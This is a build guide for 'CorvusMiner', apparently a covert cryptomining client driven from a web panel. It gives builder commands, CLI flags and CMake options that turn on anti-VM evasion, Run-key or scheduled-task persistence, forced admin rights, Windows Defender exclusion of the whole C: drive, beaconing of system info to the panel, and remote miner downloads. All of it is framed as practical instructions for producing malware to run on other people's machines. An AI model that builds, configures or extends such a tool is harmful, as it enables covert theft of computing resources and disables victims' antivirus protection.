# Building CorvusMiner Client

## Quick Start

### Windows (Easiest)
Simply **double-click `builder.exe`** in the project root. The script will:
1. Install CMake and MinGW automatically (if needed, one-time)
2. Ask you to configure build options (panel URL, features, etc.)
3. Build the Client executable
4. Show you where the binary is located

**No Visual Studio needed!** Total download: ~250MB

### PowerShell (Advanced)
Run the PowerShell script directly for same behavior:

```powershell
.\build.ps1
```

### Linux (CLI, no UI)
The Linux builder cross-compiles the same Windows client with MinGW-w64 and takes
all settings as flags, so the panel (or any script) can drive it non-interactively.
Install the toolchain once, build the builder, then run it:

```bash
sudo apt install cmake mingw-w64

cd BuilderCLI
go build -trimpath -ldflags="-s -w" -o ../builder .
cd ..

./builder -panel-urls https://panel.example.com/api/miners/submit \
          -antivm -persistence -output dist
```

The binary is written to `dist/corvus.exe`. See
[BuilderCLI/README.md](BuilderCLI/README.md) for every flag, the JSON config
format and the exit codes.

The panel drives the same builder from its **Builder** page (`/builder`): set the
URLs and feature toggles there and the compiled binary appears under
`Panel/static/builds/` for download. See [Panel/README.md](Panel/README.md).

### Windows (panel-driven builds)
When the panel itself runs on Windows it uses `Builder/build.ps1` instead of the
Linux CLI builder. No GUI or elevation is involved: the panel writes a build spec
to a temp file and runs

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File Builder/build.ps1 -panel_config <spec.json> -json
```

`build.ps1` then stages `Client/` to `%TEMP%` (the repository is never modified),
builds with MinGW and prints one JSON result document on stdout.

Requirements on the Windows host:
- PowerShell 5.0+ (built in)
- CMake and MinGW-w64 on `PATH` (`cmake`, `gcc`, `g++`, `windres`, `mingw32-make`) —
  e.g. `choco install cmake mingw -y`. The panel never installs anything or asks for admin.
- The `Builder/` folder next to `Panel/` (override with `CORVUS_BUILD_SCRIPT`)

`CORVUS_BUILDER` forces the CLI backend even on Windows.

## Build Configuration

### Config Method
- **GET from Pastebin**: Fetch config from HTTP endpoint (with embedded fallback)
- **POST to Panel**: Send system info to panel server (receives config dynamically)

### Features
- **Process Monitoring**: Pause mining when certain processes run
- **Debug Console**: Show debug output window
- **Anti-VM Detection**: Detect and disable on virtual machines
- **Persistence**: Auto-restart via Run key or scheduled task
- **Remote Miners**: Download miner updates from panel (panel method only)
- **Admin Requirement**: Force administrator privileges
- **Defender Exclusion**: Add C: drive to Windows Defender exclusion

### Miner Selection (GET method only)
- **CPU Miner (XMRig)**: Include CPU mining binary
- **GPU Miner (GMiner)**: Include GPU mining binary

## What Gets Installed

The build script automatically installs (one-time, if missing):
- **CMake** (~50MB) - Build system
- **MinGW-w64** (~200MB) - 64-bit GCC compiler & tools
- **Chocolatey** (~15MB) - Package manager (optional, for installing above)

**Total**: ~250MB - far smaller than Visual Studio's 10GB+

## Requirements

- Windows 10 or later (Windows builder), or a Linux host with `cmake` + `mingw-w64` (CLI builder)
- Internet connection (for first-time setup only)
- ~500MB free disk space
- Admin rights recommended (for Chocolatey installation)

## Output Binary

After building, the binary will be at:
```
Client/build/corvus.exe
```

With the Linux CLI builder the artifact lands at `dist/corvus.exe` (configurable with `-output` and `-name`).

## Troubleshooting

**"CMake not found"** - Run `builder.exe` again, and copy the outputs into a github issue
**"MinGW not found"** - Run `builder.exe` and do the same as above 
**Build fails** - Check that you have ~500MB free space and valid configuration  
**Pattern not found in main.cpp** - Manually edit `Client/src/main.cpp` to set your URLs

## Manual Build (If Scripts Don't Work)

```powershell
# Install 64-bit toolchain
choco install mingw-w64 cmake

# Build Client
cd Client
mkdir build
cd build

# Configure with 64-bit compiler for Release
cmake -G "MinGW Makefiles" -DCMAKE_BUILD_TYPE=Release -DCMAKE_C_COMPILER=gcc -DCMAKE_CXX_COMPILER=g++ ..

# Build
cmake --build . --config Release --parallel 4
```

## Available CMake Options

```
-DENABLE_ANTIVM=ON                    # Enable anti-VM detection
-DENABLE_PERSISTENCE=ON               # Enable persistence mechanism
-DENABLE_DEBUG_CONSOLE=ON             # Show debug console window
-DENABLE_REMOTE_MINERS=ON             # Download miners from panel
-DENABLE_ADMIN_MANIFEST=ON            # Require administrator privileges
-DENABLE_DEFENDER_EXCLUSION=ON        # Add C: drive to Defender exclusion
-DENABLE_EMBEDDED_CONFIG=ON           # Use embedded fallback config
-DENABLE_CPU_MINER=ON                 # Include XMRig (CPU mining)
-DENABLE_GPU_MINER=ON                 # Include GMiner (GPU mining)
-DEMBEDDED_CONFIG_JSON_INPUT=<path>   # Path to embedded config JSON
-DCONFIG_GET_URL=<url>                # Config GET endpoint URL(s)
```
